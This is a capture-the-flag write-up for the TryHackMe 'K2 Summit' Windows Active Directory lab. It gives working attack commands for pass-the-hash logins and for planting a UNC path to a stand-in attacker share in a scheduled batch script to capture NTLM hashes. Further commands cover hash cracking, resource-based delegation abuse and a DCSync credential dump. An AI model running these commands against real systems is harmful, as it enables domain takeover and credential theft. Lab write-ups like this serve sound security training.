---
title: "K2 - Summit"
date: 2025-08-01
draft: false
summary: "Writeup for K2 - Summit CTF challenge on TryHackMe."
tags: ["windows", "hashcrack", "brute force", "dc sync", "misconfigured privs", "cron"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/k2-summit/cover.webp"
  caption: "K2 - Summit TryHackMe Challenge"
  alt: "K2 - Summit cover"
platform: "TryHackMe"
---

Are you able to make your way through the mountain?
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/k2room

> This writeup covers the solution for k2 summit.
> - base camp writeup: https://ziomsec.com/writeups/tryhackme/k2-basecamp/
> - middle camp writeup: https://ziomsec.com/writeups/tryhackme/k2-middlecamp/

## Scanning

I performed an **nmap** aggressive scan on the target to find open ports and services running on them.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN summit.nmap
```

![](https://cdn.ziomsec.com/k2-summit/1.webp)

## Initial Foothold

I used the usernames found on middle camp to enumerate valid users on this system.

```shell
kerbruet userenum --dc TARGET -d k2.thm creds/userlist2
```

![](https://cdn.ziomsec.com/k2-summit/2.webp)

I then tried the passwords and hash that I had found on **middle camp** and **base camp** against *j.smith* user and found that the **middle camp** administrator hash was valid.

```shell
netexec smb TARGET -u 'j.smith' -H 'HASH'
netexec winrm TARGET -u 'j.smith' -H 'HASH'
```

![](https://cdn.ziomsec.com/k2-summit/3.webp)

I then accessed the machine using **evil-winrm**.

```shell
evil-winrm -i TARGET -u 'j.smith' -H 'HASH_LM'
```

![](https://cdn.ziomsec.com/k2-summit/4.webp)

I identified found another user on the system called *o.armstrong* from the `Users` directory. The `C:\` directory contained an interesting directory called *Scripts*. It contained a script that copied the contents from *o.armstrong*'s desktop to documents.

```shell
cat C:\Scripts\backup.bat
```

![](https://cdn.ziomsec.com/k2-summit/5.webp)

This was likely a scheduled task. If I could modify this, I could execute commands as *o.armstrong*. So, I looked at my permissions and found that I had privileges on the *Scripts* folder. I could replace the script with a custom one which would allow me to execute commands of my choice.

```shell
icacls backup.bat
icacls C:\Scripts
```

![](https://cdn.ziomsec.com/k2-summit/6.webp)

So, I renamed the original script and tried adding a reverse shell payload in a new *backup.bat* script. However, I was blocked by antivirus. Instead of getting a reverse shell, I tried capturing the NTLM hash by making the user try and access a share. While accessing the share, the user would authenticate with their NTLM hash and hence I could capture it.

```shell
Add-Content -Path C:\Scripts\backup.bat -Value "\\ATTACKER\share"
```

![](https://cdn.ziomsec.com/k2-summit/7.webp)

I started responder and after some time, received *o.armstrong*'s NTLM hash.

```shell
responder -I tun0
```

![](https://cdn.ziomsec.com/k2-summit/8.webp)

I saved the hash in a file and cracked it using **john**.

```shell
john --wordlists=/usr/share/wordlists/rockyou.txt hash
```

![](https://cdn.ziomsec.com/k2-summit/9.webp)

Finally, I accessed the system as *o.armstrong*.

```shell
evil-winr -i TARGET -u 'o.armstrong' -p 'arMStronG08'
```

![](https://cdn.ziomsec.com/k2-summit/10.webp)

I then captured the user flag from *Desktop*.

![](https://cdn.ziomsec.com/k2-summit/11.webp)

## Privilege Escalation

I used *o.armstrong*'s credentials to enumerate the system with **bloodhound**.

```shell
bloodhound-python -d 'k2.thm' -u 'o.armstrong' -p 'arMStronG08' -c all -ns TARGET --zip
```

![](https://cdn.ziomsec.com/k2-summit/12.webp)

I discovered that our user *o.armstrong* had **GenericWrite** permission over the *K2ROOTDC.K2.THM* account.

![](https://cdn.ziomsec.com/k2-summit/13.webp)

Hence, I could exploit this using **resource based constraint delegation**.

![](https://cdn.ziomsec.com/k2-summit/14.webp)

I first created a computer account. And then gave it permission for delegation. This account could act on behalf of other accounts (even domain admins).

```shell
impacket-addcomputer -method SAMR -computer-name 'EVIL$' -computer-pass 'Pass@123' -dc-host k2rootdc.k2.thm -domain-netbios k2.thm 'k2.thm/o.armstrong:arMStronG08'

impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'K2ROOTDC$' -action 'write' 'K2.THM/o.armstrong:arMStronG08'
```

![](https://cdn.ziomsec.com/k2-summit/15.webp)

I then requested a service ticket (TGS) to access `cifs` of *k2rootdc.k2.thm* on behalf of administrator and exported the ticket to the **KRB5CCNAME** variable.

```shell
impacket-getST -spn "cifs/k2rootdc.k2.thm" -impersonate 'administrator' 'k2.thm/EVIL$:Pass@123'

export KRB5CCNAME=administrator@cifs_k2rootdc.k2.thm@K2.THM.cacche
```

![](https://cdn.ziomsec.com/k2-summit/16.webp)

Finally, I performed DC-SYNC / dumped secrets using the kerberos ticket and found the administrator hash.

```shell
impacket-secretsdump -k -no-pass 'k2.thm/Administrator@k2rootdc.k2.thm'
```

![](https://cdn.ziomsec.com/k2-summit/17.webp)

I then accessed the target as *administrator* and captured the root flag.

```shell
evil-winrm -i TARGET -u 'administrator' -H 'HASH'
```

![](https://cdn.ziomsec.com/k2-summit/18.webp)

That's it from my side!
Until next time :)

---
